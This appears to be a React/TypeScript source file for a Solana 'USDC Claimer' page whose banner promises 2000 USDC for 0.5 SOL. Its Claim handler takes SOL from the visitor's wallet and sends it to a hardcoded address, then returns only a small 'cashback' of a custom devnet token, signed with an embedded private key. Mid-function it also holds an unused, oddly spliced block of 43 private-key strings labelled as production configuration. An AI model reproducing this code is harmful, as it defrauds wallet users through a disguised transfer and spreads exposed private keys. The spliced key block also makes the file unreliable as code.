/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "5twrFZL3ZvfXjoAeMB1wff1zBGMRVcLpAvgF7iHZJuKkVGtTgv5zHZGUbC4dsmsbWfkxxFbiqScBDWjrqmgHCka"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "5tiziAsxbqMQo4ugowT5xLmpL6mYUyfz95EqNeuMUknyE1wi4d7nm8PNMvKgEAiXQiFiriszXm85gY2d2hd9TUPd",
  "key1": "2b3d7KX6zAYTrs7cH1gWBz5grsbHczHFZ4efXRVJtbBRJ73Hc59ngHt9c9C4KDNJYExSUC3ZUYQJNwgLDT4rDxxD",
  "key2": "3WvHYtRDeJqDUeUkwmdgJyHsb7mmQUqtww1jwyfY4PUHAokFwJVw3GUqGHqMdwdnpi187JAxypvGrtgpYpDtfuDu",
  "key3": "4oUbtjsMFiqsZm3offsTLQWmk7m54tfrrEPaDu9eTnTMLnGgD9FF49nxF9mt17FuNtdGYYXsboRPp3ihqauXvybq",
  "key4": "4EPFPLUhWb7vyWeFjdJPdnRiGs8QJHHe2BYbGwQBHxUDdcU4XrFcJyPJCTzV3AZJFGvyvr16R6hNZXxff7P76p6o",
  "key5": "46guycD5Ezn4iCd9gT6KfnGcfNLEDwFJsA42DByzvqsbNbQ62ZNyxeT9msR8GbaBGzcrrQc8ck4dTTiyFY3Sv3aa",
  "key6": "3FhDnDWjghePEENu7hgHTaXdpjNHH385AFkUb1XjgRrcomYrddMeg8Ko93hjcMk3CLWdBsrRFkwXn3ttgtujXGy9",
  "key7": "25SwHDxJW5SwcvYKiuUWzQP4kBp7NHePDCgDTPn4etY7chqXMNDo8vwVS5ZSWJ9vvHJMA6ke56CpEHaXhUAK1Gtj",
  "key8": "5WU2RD3j3LA5WFuLK2Mz3cf6VQoiDv6Vn1B2Juckh6NFbJ4scRf6rADTMfZGCr9TVu2wQ1g93a8o7jpdcBs1ViWH",
  "key9": "51RSJqEKQXhjCTDximd6iEJ5TPRbZ4BQWc4ZJnytbTWzxLuTczjrjsf8kkg2XydL8NkBAhEKaHtm1szH2usG86zo",
  "key10": "5PCbHq6AGdnb4XDxHUYmRHcd8tWMYvHLEmgpzBmYji647SeA9PCp2jNRGaoYLks9C1HdSwcobTB4cXohckAvY2ov",
  "key11": "1tKqweoEGE6yR2pEo3eDLcYkXi7H34bnBVJuVQTMjbrFYbcA3pP9DhjoQnCn7RvsanbWVw44swHQnzPTwND9Bzg",
  "key12": "4sDa3YNxmgFJoaec4teAdRyW7Urz11mEnpHhhFrKzGozyFa4DXW52j8srWfu1usd4BpDZzPNtepgQ1cPEEz9Ybey",
  "key13": "5GP9F6bPqNoyipFdyYWYvhcK3VFX4dJnLUJDBTrnzgn4qNDh1TR6VLFXDhpNY1q6AYn8gt5M2yfS93hEHzqXtZrz",
  "key14": "5yhnJZEfy1uRaQgpeTF8LdTrGpvg833pH6xLaS8BMycN36dPNhLQ5CCer1og2ZBF4ABsLhBaKJ7BHDSGjXRowKtc",
  "key15": "37NJTw5Prvnq1HGNMjVyppZxEGYaLnDC1D1JNSWDwjFqehWLiW77eUy3sEUmi3Mn5vEGt97FLksYQsMhaGvkMViD",
  "key16": "XbHLhotRNvYrnG1MdsBQiPNpCfcP9kKzzPmURK8LH76b6Vzr6quugPDK4ShZv5CH5m2HA3M9i8FAJnDeQBX5phr",
  "key17": "NirTF5i8zmHHnN8zyVdvWd7wZURmQNsvc4hHnENwtfddFGygfMhM2GcFPoPtkruPJnf2xujqWZjLvfdRbAwPBuj",
  "key18": "3Z4D4HDYKvuwob33icbAqHYkeefdsYyrbQHxV9s58vVWU8HUSukPuU5HCR9Gn3GRxyzFt6i1PDngShVPyvRf9uQQ",
  "key19": "5VeerHR4aKfNNCTSMPqNLQsEF5mAx7nZwxAxrP1Ct9SDEhvwH1avKk9xQhNEXzAXvDuQcoHemnV1cRdMo8jvq37q",
  "key20": "2HSnFVKbk7nuZeo44BU2iodK8UaCFwSqG48e4dWYs8DqUDwuBdajMFg8ECN3pUw78sNn7Bj2Z4brzWo45aRHvh1E",
  "key21": "31bdxqNRbK1TDNPZtLt5S4Upoqc1CnR6WDV4QhEtyNXoSc2rr93Q1tQzDAVuvcFYUveSqpEcCZKPGW7x4NYmpxSy",
  "key22": "EVUsBYv8921P7pgaSCnsjJk9c1e99XFvwvBqPCCD2SbbqXDsFoG9tuDcHNvHpNS84ckdSsN6PPy1VyDV2QYx9kL",
  "key23": "5W88p5MZCDfGz5gqZ1ZLx93sTeSoKrUpnVBK3ZUx34ydt5hdkMAPVWFGyGsHg8woFXCLEJuMfp6jt46ttu4LE2kj",
  "key24": "2CCLNg1E1tfU34ei2mCcZNjP5wrgoWyMJX1Ec6SjNVFA8ABobMsUgRgTL7kBpCssDPqjtykpj28pLf5hsFHrPePA",
  "key25": "4KCS3Th2FhYfvWpoRyuKDZiS4KVC9iCzUNouiRTJqPnaia9enWUVASSkcYM5CUz4PjwfZuXkpUVUGP9TE75ofmap",
  "key26": "3xTppwgWZioeBbVkqRcP6d5RHjWqA8CATgkvidFbfCaj7BkXUMxZkh9tDrFfBGiuDycKFUbfrBvWxgxQnYNT9WjN",
  "key27": "4HoFV2WxZwJB5i2J4C6FhiGtShWhr1Zovd4Q1UQNCaSWMGkU6xBeQ3ehQbcce6XTYMwSMsDXF7ExHdkJq2cFRo8w",
  "key28": "VmD2j9RMq8zjRJTnuQMPfRhJY828eHssbpVHng3yR3sGxZNmRN37trYXAXo7LmKRM1L25GNc4GfMvsYrVNDMc4e",
  "key29": "SuGrbUa4m5LT88FKhqByEF2MrcWYvkFhidLbMufJoHRPSkBH41sSVF2jMZB3Ra2dkqk8nvu5kbR3gx8Ww6a4JC6",
  "key30": "sUpdwpNDNhEh72srpgeGtiMMCokhHZmtYceMd2Su5doHfeGkFJdxpMay2ek6dGFiv13g12iCaAtZrmR3yRJADNs",
  "key31": "24ECKXJEwQJckHAFjpkmZgHBG4NjaMGx8JPhtdhPwuEyuVi89pvFzxJw9Zt62uz7WRFLSmRyA1evbmcK2jetiS7H",
  "key32": "5619WLe1fpqduQBjDjNPHjK1LEsoyjFALtucT7cmnAQgdDNFFpUit6tq1Dh5Jhb6wm3P3uHbkKiGMxsygRzvonc7",
  "key33": "2CmBi8vibw6UBzpuyQQWK712EBey3XLGYpmEJyGcD8cNQqJ2EocZDnLiUs47DerNLyvHS6zGZEoYd8dxpeHL2vTh",
  "key34": "3Mw3RHExukuHpqzprkgREgCAMMhRryjTnaJhE8gQNhtDG86G4GgaP2k86QWcBpQw5UQKMi9TK4MEAKSFaWWhuA7X",
  "key35": "4ddaRsXLY9yoWTYAX21C22ZZbB7KywMoM7hR9NbyqpHsGfpYppw46jHeStpCe1AJkWzAno6Rgcm7oiaa2dHLpRiZ",
  "key36": "418SSa8wv5i3kSLKpWWABfvkrzgWeLe86jatRDe3ZjFWc5ShuymVQxef2p6S7zFvJJ51zkYEp6gQSz6VkYichaFh",
  "key37": "qWaGntZke19xqgtQ7KyHSHdhGWJ7zk8FsYfybSmGVUqoLfXt4TVywEWn4oAUnaGTuhnGRyWkZMvJqyTAQUtEcV2",
  "key38": "2N1UQX1QoZaVkMt1N1RoGwKfZsrb2rAsr5jVsWHKTtj68iYyauKcNSfQ7xn58kyimS1WjR1vTbXkJkdYJpQSHgaj",
  "key39": "DuWWisXQp9Re6SWZx42b6CCqiNGrCXUpzgakwhCpPTDdvY4VdEQRAt4dSZCasFfbrpFuU2aPjrNHUDmLLXYKvAu",
  "key40": "5L7cq5GwTLFhw1izhzLqfHhezUZh8midoPr42n3LCsD6KkeACmCVv5dwbgHxhMGgHJLp4N3SAcYm87pX1g6w6jFp",
  "key41": "fsmVHPiCmGpp8eM6UFmgHM9by6Mb4UmVWYnqy6A5wQhhTRQpARZAA8pZiWNcaX7QT5cU1VAtzwzJ7CybzYDaFHw",
  "key42": "5Xpb3LTYucrNZMGJy7F3YdqAArQmDwTSYb3Z2JerBrzQcU2oXBCmouG6WvTiCLsuc5QTxtURqvNcbQBYWWbf9ySa"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
